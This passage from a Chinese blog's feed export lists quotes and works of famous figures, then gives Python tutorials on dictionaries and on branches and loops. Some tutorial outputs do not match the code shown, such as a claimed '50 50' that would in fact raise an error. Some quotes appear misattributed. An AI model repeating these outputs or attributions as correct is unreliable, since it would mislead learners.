src="https://pics6.baidu.com/feed/10dfa9ec8a136327e8311d92b3e335e509fac72d.jpeg@f_auto?token=6da2e3273c0068872303c25852c83cc2" alt></p><ul><li>创立的宏观经济学</li><li>现代归纳逻辑</li></ul><p><strong>名言：</strong></p><ul><li>长远是对当前事务错误的指导。从长远看，我们都已经死了。<br>In the long run, we are all dead.</li><li>经济学家和政治哲学家们的思想，不论它们是在对的时候还是在错的时候，都比一般所设想的要更有力量。的确，世界就是由他们统治着。讲求实际的人自以为不受任何理论的影响，其实他们经常是某个已故的经济学家的俘虏。在空中听取意见的当权的狂人们，他们的狂乱的想法也多半是从若干年前学术界拙劣的作家的作品中提取出来的。我确信，和思想的逐渐侵蚀相比，既得利益的力量是被过分夸大了。诚然，这不是就当前而言，而是指一段时期以后。因为在经济学和政治哲学领域中，在25岁或30岁以后还受新理论影响的人是不多的。因此公职人员、政客甚至煽动者们所能运用的理论不大可能是最新的。但是，不论早晚，不论好坏，危险的东西不是既得利益，而是思想！</li></ul><p><strong>著作：</strong></p><ul><li>《就业、利息与货币通论》</li><li>《论概率》</li></ul><h2 id="伏尔泰"><a href="#伏尔泰" class="headerlink" title="伏尔泰"></a>伏尔泰</h2><p><img src="https://img2.baidu.com/it/u=1192643646,1844647584&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=712" alt></p><ul><li>人的本质是平等的</li><li>尊重人性与人的本能</li><li>理性主义</li><li>自由</li><li>平等</li></ul><p><strong>名言：</strong></p><ul><li>我们所有的人都有缺点和错误，让我们互相原谅彼此的愚蠢，这是自然的第一法则。</li><li>人最宝贵的财富是希望，如果只着眼于当前，我们就不会去播种。</li></ul><h2 id="伊曼努尔·康德"><a href="#伊曼努尔·康德" class="headerlink" title="伊曼努尔·康德"></a>伊曼努尔·康德</h2><p><img src="https://pics4.baidu.com/feed/fc1f4134970a304edc4cc09434352480c8175c72.jpeg?token=b0e98ccf8e3f5aad42f1a8edcc6c68ce" alt></p><ul><li>德国古典哲学创始人</li><li>理性主义</li><li>三大批判<br>1.《纯粹理性批判》<br>2.《实践理性批判》<br>3.《判断力批判》</li></ul><p><strong>名言：</strong></p><ul><li>给我物质，我就用它造出一个宇宙来。</li><li>所谓自由，不是随心所欲，而是自我主宰。</li><li>一个行为的道德性不取决于它的结果，而仅仅取决于该行为背后的意图。</li><li>知识分子是敢于在一切公共场合运用理性的人。</li><li>经验虽然告诉我们某物是如此这般的状况，但并不告诉我们它不能是另外的状况。</li><li>形而上学的真正路径不是跟杂乱无边的经验对象打交道，而是从理性本身出发，并且至于理性本身产生对话，这才是形而上学的根基，不可拔除。</li></ul><h2 id="约翰·塞巴斯蒂安·巴赫"><a href="#约翰·塞巴斯蒂安·巴赫" class="headerlink" title="约翰·塞巴斯蒂安·巴赫"></a>约翰·塞巴斯蒂安·巴赫</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/6d81800a19d8bc3e72d6d678878ba61ea9d345a2?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>“西方音乐之父”</li></ul><p><strong>名曲：</strong></p><ul><li>勃兰登堡协奏曲</li><li>马太受难曲</li><li>B小调弥撒曲</li></ul><h2 id="坂本龙一"><a href="#坂本龙一" class="headerlink" title="坂本龙一"></a>坂本龙一</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/eac4b74543a9822624171b7e8582b9014b90eb91?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>法国艺术及文学勋章军官勋位</li><li>第60届奥斯卡金像奖-最佳原创配乐奖</li></ul><p><strong>名言：</strong></p><ul><li>喜欢在大都市里自己默默无闻的感觉，正因为谁都不认识我，某种程度上自己很自由。当然这也是一种孤独，但孤独有时也是自由的代名词。</li><li>艺术很长。而生命短暂。</li></ul><p><strong>著作：</strong></p><ul><li>《圣诞快乐，劳伦斯先生》</li></ul><h2 id="马塞尔·杜尚"><a href="#马塞尔·杜尚" class="headerlink" title="马塞尔·杜尚"></a>马塞尔·杜尚</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/42a98226cffc1e17ed2c203e4b90f603738de92a?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt></p><ul><li>现代艺术的守护神</li><li>达达主义及超现实主义的代表人物和创始人之一</li><li>马塞尔·杜尚不属于任何流派，因为他一生都在追求自由，真正心灵的自由。</li></ul><p><strong>名言：</strong></p><ul><li>艺术要么是剽窃，要么是革命。<br>“Art is either plagiarism or revolution.”</li><li>我对’艺术’二字没兴趣， 因为我这两个字本身早已失去了信仰。所以我不想用这两个字。今天世界上对’艺术’有太多没必要的钟爱。<br>“I don’t care about the word ‘art’ because it has been so discredited. So I want to get rid of it. There is an unnecessary adoration of ‘art’ today.”</li><li>我的做法是选择一个，无论美丽或者丑陋，都无法吸引我的东西，从而找到视觉上的冷漠。或许，你会说我找到了不少这样的东西。其实，这是很难的，因为你要看个东西看久了，多少它就变得顺眼了。所以一旦它变得顺眼，我就得抛弃它了。</li></ul><h2 id="威廉·莎士比亚"><a href="#威廉·莎士比亚" class="headerlink" title="威廉·莎士比亚"></a>威廉·莎士比亚</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/77c6a7efce1b9d16b7629988fddeb48f8d5464b5?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>“人类文学奥林匹斯山上的宙斯”</li></ul><p><strong>代表作品:</strong></p><ul><li>《哈姆雷特》</li><li>《奥赛罗》</li><li>《李尔王》</li><li>《麦克白》</li><li>《仲夏夜之梦》</li><li>《威尼斯商人》</li><li>《第十二夜》</li><li>《皆大欢喜》</li></ul><h2 id="刘慈欣"><a href="#刘慈欣" class="headerlink" title="刘慈欣"></a>刘慈欣</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/4034970a304e251fd6a6b7cfa986c9177f3e53b7?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt></p><ul><li>中国科幻文学的里程碑</li><li>“中国科幻第一人”</li><li>一个冷漠的宇宙观察者，冷酷的道德评判者，再加上一个冷静的思想者</li></ul><p><strong>著作：</strong></p><ul><li>《三体》三部曲</li><li>《流浪地球》</li><li>《球状闪电》</li></ul><h2 id="孔子"><a href="#孔子" class="headerlink" title="孔子"></a>孔子</h2><p><img src="https://img1.baidu.com/it/u=3542530181,3994172756&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt></p><ul><li>中国古代伟大的思想家、政治家、教育家</li><li>儒家学派创始人</li><li>“大成至圣先师”</li><li>修订《六经》</li><li>创办私学</li></ul><p><img src="https://img1.baidu.com/it/u=2641079357,3822459288&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=723" alt><br><strong>名言：</strong></p><ul><li>言必信，行必果。</li><li>温故而知新。</li><li>士不可以不弘毅，任重而道远。</li><li>吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎。</li><li>君子泰而不骄，小人骄而不泰。</li><li>三人行，必有我师焉，择其善者而从之，择其不善者而改之。</li><li>志士仁人，无求生以害仁，有杀身以成仁。</li><li>后生可畏，焉知来者之不如今也。</li></ul><h2 id="老子"><a href="#老子" class="headerlink" title="老子"></a>老子</h2><p><img src="https://pic.rmb.bdstatic.com/bjh/news/e945bc91a5888881f780ef5e10a3dd2c5757.jpeg" alt></p><ul><li>世界辩证法鼻祖</li><li>无为而治</li><li>物极必反</li></ul><p><strong>名言：</strong></p><ul><li>祸兮，福之所倚；福兮，祸之所伏。</li><li>人法地，地法天，天法道，道法自然。</li><li>祸莫大于不自知；咎莫大于欲得。故知足之足，常足矣。</li><li>天下难事，必作于易；天下大事，必作于细。</li></ul><p><strong>著作：</strong></p><ul><li>《道德经》</li></ul><h2 id="黑格尔"><a href="#黑格尔" class="headerlink" title="黑格尔"></a>黑格尔</h2><p><img src="https://img1.baidu.com/it/u=1781659450,3394536782&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=612" alt></p><ul><li>建立了世界哲学史最为庞大的客观唯心体系</li><li>极大丰富了辩证法</li></ul><p><strong>名言：</strong></p><ul><li>无知者是不自由的，正因和他对立的是一个陌生的世界。</li><li>凡是现实（存在）的就是合理的，凡是合理（存在）的就是现实的。</li><li>切实苦干的人往往不是高谈阔论的，他们惊天动地的事业显示了他们的伟大，可是在筹划重大事业的时候，他们是默不作声的。</li><li>一句哲理在年轻人嘴里说出和在老年人嘴里说出是不一样的。年轻人说的只是这句哲理本身，尽管他可能理解得完全正确。而老年人不只是说了这句哲理，其中还包括了他的全部生活。</li><li>我们能够断言，没有激情，任何伟大的事业都不能完成。</li></ul><h2 id="卡尔·马克思"><a href="#卡尔·马克思" class="headerlink" title="卡尔·马克思"></a>卡尔·马克思</h2><p><img src="https://img1.baidu.com/it/u=2494960820,1208431921&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1080&amp;h=660" alt></p><ul><li>历史唯物主义</li><li>国际共产主义运动的开创者</li><li>发起社会主义科学</li><li>创建马克思主义</li><li>发现人类社会历史发展的客观规律</li><li>批判观</li></ul><p><strong>名言：</strong></p><ul><li>社会的进步，是人类对美的追求的结晶</li><li>在科学大道上没有平淡的大路可以走，只有在崎岖的小路上攀登而不畏劳苦的人，才有希望到达光辉的顶点。</li><li>青春的光辉，理想的钥匙，生命的意义，乃至人类的生存发展…全部包含在这两个字之中…奋斗！只有奋斗，才能治愈过去的创伤；只有奋斗才是我们民族的希望和光明所在。</li><li>人只有为同时代的人完美，为他们的幸福而工作，自己才能达到完美。</li></ul><h2 id="弗拉基米尔·伊里奇·列宁"><a href="#弗拉基米尔·伊里奇·列宁" class="headerlink" title="弗拉基米尔·伊里奇·列宁"></a>弗拉基米尔·伊里奇·列宁</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/78310a55b319ebc4b74552e65073d8fc1e178a82b80d?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>领导十月革命</li><li>缔造世界上第一个社会主义国家</li><li>组织建设共产国际</li></ul><p><img src="https://bkimg.cdn.bcebos.com/pic/cf1b9d16fdfaaf51f3debe9fe10683eef01f3a29cccb?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt><br><strong>名言：</strong></p><ul><li>患难识朋友。</li><li>宪法，就是一张写着人民权利的纸。</li><li>浪费别人的时间是谋财害命，浪费自己的时间则是慢性自杀。</li><li>在革命事业中，认识到自己的缺点就等于改正了一大半。</li><li>人需要梦想，但是需要人的符合自然的梦想，而不是超自然的梦想。</li><li>任何国家都意味着使用暴力。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-字典</title>
      <link href="/2023/01/22/Python/Python-%E5%AD%97%E5%85%B8/"/>
      <url>/2023/01/22/Python/Python-%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>字典是Python中唯一实现<code>映射关系</code>的内置类型</p><h2 id="1-解决单表代换密码问题"><a href="#1-解决单表代换密码问题" class="headerlink" title="1. 解决单表代换密码问题"></a>1. 解决单表代换密码问题</h2><h3 id="1-1-模拟字典方法"><a href="#1-1-模拟字典方法" class="headerlink" title="1.1 模拟字典方法"></a>1.1 模拟字典方法</h3><blockquote><p><code>以下不是真正的字典，但可以实现类似的功能</code></p><ol><li>通过两个列表对照实现<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c_table = [<span class="string">&quot;cipher1&quot;</span>, <span class="string">&quot;cipher2&quot;</span>...] <span class="comment"># 密文表</span></span><br><span class="line">d_table = [<span class="string">&quot;plain1&quot;</span>, <span class="string">&quot;plain2&quot;</span>...] <span class="comment"># 明文表</span></span><br><span class="line">cipher = <span class="built_in">input</span>(<span class="string">&quot;input your cipher&quot;</span>) <span class="comment"># 输入密文</span></span><br><span class="line">split_cipher = cipher.split(<span class="string">&quot; &quot;</span>) <span class="comment"># 密文拆分</span></span><br><span class="line">result = [d_table[c_table.index(each)] <span class="keyword">for</span> each <span class="keyword">in</span> split_cipher] <span class="comment"># 通过查找密文下标找到对应下标明文来解密</span></span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment"># 打印结果</span></span><br></pre></td></tr></table></figure></li><li>通过一个列表实现<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="string">&quot;cipher1&quot;</span>, <span class="string">&quot;plain1&quot;</span>, <span class="string">&quot;cipher2&quot;</span>, <span class="string">&quot;plain2&quot;</span> ...]</span><br><span class="line">cipher = <span class="built_in">input</span>(...) <span class="comment"># 输入密文</span></span><br><span class="line">split_cipher = cipher.split(<span class="string">&quot; &quot;</span>) <span class="comment"># 密文拆分</span></span><br><span class="line">result = [table[table.index(each) + <span class="number">1</span>] <span class="keyword">for</span> each <span class="keyword">in</span> split_cipher] <span class="comment"># 通过查找密文下标，得到其下一位，即对应的明文</span></span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment"># 打印结果</span></span><br></pre></td></tr></table></figure></li></ol><p>这两种方法在处理小量数据的时候和字典效率相差不大，但由于其数据结构本身不是映射关系，实际在处理大量数据时效率远不及字典</p></blockquote><h3 id="1-2-字典方法"><a href="#1-2-字典方法" class="headerlink" title="1.2 字典方法"></a>1.2 字典方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;<span class="string">&quot;cipher1&quot;</span>:<span class="string">&quot;plain1&quot;</span>, <span class="string">&quot;cipher2&quot;</span>:<span class="string">&quot;plain2&quot;</span>, <span class="string">&quot;cipher3&quot;</span>:<span class="string">&quot;plain3&quot;</span>...&#125;</span><br><span class="line">cipher = <span class="built_in">input</span>(<span class="string">&quot;input your cipher&quot;</span>)</span><br><span class="line">split_cipher = cipher.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">result = [table[each] <span class="keyword">for</span> each <span class="keyword">in</span> split_cipher]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="2-字典基础用法"><a href="#2-字典基础用法" class="headerlink" title="2. 字典基础用法"></a>2. 字典基础用法</h2><p>Python中，字典内一对数据叫做一个<code>键值对</code>：dic = {“键”:”值”}，一个键对应一个值</p><h3 id="2-1-字典的6种一般声明方法"><a href="#2-1-字典的6种一般声明方法" class="headerlink" title="2.1 字典的6种一般声明方法"></a>2.1 字典的6种一般声明方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">&quot;alpha&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;bravo&quot;</span>:<span class="string">&quot;b&quot;</span>...&#125;</span><br><span class="line">b = <span class="built_in">dict</span>(alpha=<span class="string">&quot;a&quot;</span>, bravo=<span class="string">&quot;b&quot;</span>...)</span><br><span class="line">c = <span class="built_in">dict</span>([(<span class="string">&quot;alpha&quot;</span>, <span class="string">&quot;a&quot;</span>), (<span class="string">&quot;bravo&quot;</span>, <span class="string">&quot;b&quot;</span>)...])</span><br><span class="line">d = <span class="built_in">dict</span>(&#123;<span class="string">&quot;alpha&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;bravo&quot;</span>:<span class="string">&quot;b&quot;</span>...&#125;)</span><br><span class="line">e = <span class="built_in">dict</span>(&#123;<span class="string">&quot;alpha&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;bravo&quot;</span>:<span class="string">&quot;b&quot;</span>...&#125;, charlie=<span class="string">&quot;c&quot;</span>...)</span><br><span class="line">f = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="string">&quot;alpha&quot;</span>, <span class="string">&quot;bravo&quot;</span>, <span class="string">&quot;charlie&quot;</span>...], [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>...]))</span><br><span class="line">a == b == c == d == e == f <span class="comment"># True # &lt;class &#x27;dict&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-fromkeys声明"><a href="#2-2-fromkeys声明" class="headerlink" title="2.2 fromkeys声明"></a>2.2 fromkeys声明</h3><blockquote><p>fromkeys(iterable, value) 其中value是可选参数，默认为None<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dic = <span class="built_in">dict</span>.fromkeys(<span class="string">&quot;Momoyeyu&quot;</span>, <span class="number">0</span>) <span class="comment"># 键被看作集合，重复的o和y只会存一个</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure><br>Output<br>{‘M’: 0, ‘o’: 0, ‘m’: 0, ‘y’: 0, ‘e’: 0, ‘u’: 0}</p></blockquote><h3 id="2-3-修改字典"><a href="#2-3-修改字典" class="headerlink" title="2.3 修改字典"></a>2.3 修改字典</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dic = <span class="built_in">dict</span>.fromkeys(<span class="string">&quot;Momoyeyu&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line">dic[<span class="string">&quot;M&quot;</span>] = <span class="number">1</span> <span class="comment"># 改</span></span><br><span class="line">dic[<span class="string">&quot;New&quot;</span>] = <span class="number">2</span> <span class="comment"># 增</span></span><br><span class="line">dic.pop(<span class="string">&quot;o&quot;</span>) <span class="comment"># 删 （pop的返回值是删除的值）</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure><p>Output:<br>{‘M’: 0, ‘o’: 0, ‘m’: 0, ‘y’: 0, ‘e’: 0, ‘u’: 0}<br>{‘M’: 1, ‘m’: 0, ‘y’: 0, ‘e’: 0, ‘u’: 0, ‘New’: 1}  </p><p>键被当作下标使用，这也解释了为什么键要被视为集合储存：<code>具有无序性和唯一性</code><br>一个字典中没有两个相等的键，但不同的键可以关联同一个值，<code>键重复了就用新的值覆盖旧的值</code>  </p></blockquote><p><strong>2.3.1 关于删除</strong></p><blockquote><ol><li><p>dic.pop(key, default)<br>若pop的键key不存在dic中，pop会报错，但也可以通过可选参数default来设置报错内容  </p></li><li><p>dic.popitem()<br>在python3.7以后的版本，字典的键值对才有储存顺序，popitem会弹出最后一个加入字典dic的键值对<br>但在python3.7以前的版本，popitem会随机弹出一个键值对  </p></li><li><p>del关键词<br>通过 del dic[‘键’] 也可以删除一个键值对，也可以 del dic 直接删除字典，注意和 dic.clear() 区分  </p></li><li><p>clear()<br>通过 dic.clear() 可以得到空字典，注意和 del dic 区分  </p></li></ol></blockquote><h2 id="3-其他字典函数"><a href="#3-其他字典函数" class="headerlink" title="3. 其他字典函数"></a>3. 其他字典函数</h2><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">dic.get(key, default=None)</td><td style="text-align:center">查找key对应的value，不存在则返回None</td></tr><tr><td style="text-align:center">dic.setdefault(key, value)</td><td style="text-align:center">查找key的值，若key存在，返回key原本的value；若key不存在，则把键值对key:value添加到dic中</td></tr><tr><td style="text-align:center">dic.keys()</td><td style="text-align:center">返回dic的<code>键的视图对象</code></td></tr><tr><td style="text-align:center">dic.values()</td><td style="text-align:center">返回dic的<code>值的视图对象</code></td></tr><tr><td style="text-align:center">dic.items()</td><td style="text-align:center">返回dic的<code>字典视图对象</code></td></tr></tbody></table></div><h3 id="3-1-关于视图对象"><a href="#3-1-关于视图对象" class="headerlink" title="3.1 关于视图对象"></a>3.1 关于视图对象</h3><p>视图对象是字典的<code>动态</code>视图，字典改变的时候，其视图对象会随之改变</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dic = <span class="built_in">dict</span>.fromkeys(<span class="string">&quot;Momoyeyu&quot;</span>, <span class="number">0</span>)</span><br><span class="line">keys = dic.keys()</span><br><span class="line">values = dic.values()</span><br><span class="line">items = dic.items()</span><br><span class="line"><span class="built_in">print</span>(keys)</span><br><span class="line"><span class="built_in">print</span>(values)</span><br><span class="line"><span class="built_in">print</span>(items)</span><br><span class="line">dic.pop(<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(items)</span><br></pre></td></tr></table></figure><p>Output:<br>dict_keys([‘M’, ‘o’, ‘m’, ‘y’, ‘e’, ‘u’])<br>dict_values([0, 0, 0, 0, 0, 0])<br>dict_items([(‘M’, 0), (‘o’, 0), (‘m’, 0), (‘y’, 0), (‘e’, 0), (‘u’, 0)])<br>dict_items([(‘o’, 0), (‘m’, 0), (‘y’, 0), (‘e’, 0), (‘u’, 0)])  </p></blockquote><h2 id="4-嵌套字典"><a href="#4-嵌套字典" class="headerlink" title="4. 嵌套字典"></a>4. 嵌套字典</h2><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">&quot;Momoyeyu&quot;</span>:&#123;<span class="string">&quot;Chinese&quot;</span>:<span class="number">60</span>, <span class="string">&quot;Math&quot;</span>:<span class="number">50</span>, <span class="string">&quot;English&quot;</span>:<span class="number">40</span>&#125;&#125;</span><br><span class="line">b = &#123;<span class="string">&quot;Momoyeyu&quot;</span>:[<span class="number">60</span>, <span class="number">50</span>, <span class="number">40</span>]&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&quot;Momoyeyu&quot;</span>][<span class="string">&quot;Math&quot;</span>], end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&quot;Momoyeyu&quot;</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>Output:<br>50 50</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-分支和循环</title>
      <link href="/2023/01/20/Python/Python-%E5%88%86%E6%94%AF%E5%92%8C%E5%BE%AA%E7%8E%AF/"/>
      <url>/2023/01/20/Python/Python-%E5%88%86%E6%94%AF%E5%92%8C%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>参考资料：<br><a href="https://www.bilibili.com/video/BV1c4411e77t">【Python教程】《零基础入门学习Python》最新版（2022年12月26日更新）</a></p></blockquote><h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><h2 id="1-if结构"><a href="#1-if结构" class="headerlink" title="1. if结构"></a>1. if结构</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    statement_1(s1)</span><br><span class="line">statement_2(s2)</span><br></pre></td></tr></table></figure><h2 id="2-if-else结构"><a href="#2-if-else结构" class="headerlink" title="2. if-else结构"></a>2. if-else结构</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    statement_1(s1)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    statement_2(s2)</span><br><span class="line">statement_3(s3)</span><br></pre></td></tr></table></figure><h2 id="3-if-elif-elif…-else-结构"><a href="#3-if-elif-elif…-else-结构" class="headerlink" title="3. if-elif-elif…(-else)结构"></a>3. if-elif-elif…(-else)结构</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition_1:</span><br><span class="line">    statement_1(s1)</span><br><span class="line"><span class="keyword">elif</span> condition_2:</span><br><span class="line">    statement_2(s2)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     statement_n(sn)</span></span><br></pre></td></tr></table></figure><h2 id="4-oneline结构"><a href="#4-oneline结构" class="headerlink" title="4. oneline结构"></a>4. oneline结构</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">true_statement <span class="keyword">if</span> condition <span class="keyword">else</span> false_statement</span><br></pre></td></tr></table></figure><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="1-while循环"><a href="#1-while循环" class="headerlink" title="1. while循环"></a>1. while循环</h2><h3 id="1-1-基本结构"><a href="#1-1-基本结构" class="headerlink" title="1.1 基本结构"></a>1.1 基本结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> condition:</span><br><span class="line">    statement_1(s1)</span><br><span class="line">statement_2(s2)</span><br></pre></td></tr></table></figure><h3 id="1-2-while-break结构"><a href="#1-2-while-break结构" class="headerlink" title="1.2 while-break结构"></a>1.2 while-break结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> condition_1:</span><br><span class="line">    statement_1(s1)</span><br><span class="line">    <span class="keyword">if</span> condition_2:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    statement_2(s2)</span><br><span class="line">statement_3(s3)</span><br></pre></td></tr></table></figure><h3 id="1-3-while-else结构"><a href="#1-3-while-else结构" class="headerlink" title="1.3 while-else结构"></a>1.3 while-else结构</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> condtion_1:</span><br><span class="line">    statement_1(s1)</span><br><span class="line">    <span class="keyword">if</span> condition_2:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    statment_2(s2)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    statment_3(s3)</span><br><span class="line">statement_4(s4)</span><br></pre></td></tr></table></figure><p>仅在循环由condition_1退出时才执行else，由break终止则不执行else</p></blockquote><h3 id="1-4-嵌套结构"><a href="#1-4-嵌套结构" class="headerlink" title="1.4 嵌套结构"></a>1.4 嵌套结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">9</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(j, <span class="string">&quot;*&quot;</span>, i, <span class="string">&quot;=&quot;</span>, j*i, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 * 1 = 1 </span><br><span class="line">1 * 2 = 2 2 * 2 = 4 </span><br><span class="line">1 * 3 = 3 2 * 3 = 6 3 * 3 = 9 </span><br><span class="line">1 * 4 = 4 2 * 4 = 8 3 * 4 = 12 4 * 4 = 16 </span><br><span class="line">1 * 5 = 5 2 * 5 = 10 3 * 5 = 15 4 * 5 = 20 5 * 5 = 25 </span><br><span class="line">1 * 6 = 6 2 * 6 = 12 3 * 6 = 18 4 * 6 = 24 5 * 6 = 30 6 * 6 = 36 